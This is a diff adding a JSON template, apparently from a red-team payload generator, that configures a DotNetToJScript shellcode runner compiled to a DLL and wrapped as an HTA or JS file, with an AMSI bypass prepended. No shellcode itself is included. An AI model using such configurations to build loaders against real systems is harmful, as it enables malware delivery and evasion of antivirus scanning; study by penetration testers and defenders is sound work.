@@ -1,0 +1,41 @@
+{
+    "category" : ["dll","amsi"],
+    "description" : "DotNetToJScript shell code runner.",
+    "contentFile" : "dllshellcodefordotnettojscript.txt",
+    
+    "shellCode" : {
+        "hasShellCode":true,
+        "format" : "csharp"
+                        
+    },
+    "compilation": {
+        "compilationType": "jscript",
+        "target" : "library",
+        "compilationAttributes": [
+            {
+                "name": "architecture",
+                "description": "The architecture of the shellcode, x64 or x86.",
+                "defaultValue": "x64"
+            },
+            {
+                "name": "saveAs",
+                "description": "Name of library to be created, can be full path or just a name",
+                "defaultValue": "shell.dll"
+            },
+            {
+                "name": "format",
+                "description" : "Option of either js or hta.",
+                "defaultValue" : "hta"
+            },
+            {
+                "name": "saveJSAs",
+                "description": "Name of final file to be created, can be full path or just a name",
+                "defaultValue": "shell.hta"
+            }
+        ],
+
+
+        
+        "prepend" : "jsamsibypass"
+    }
+}
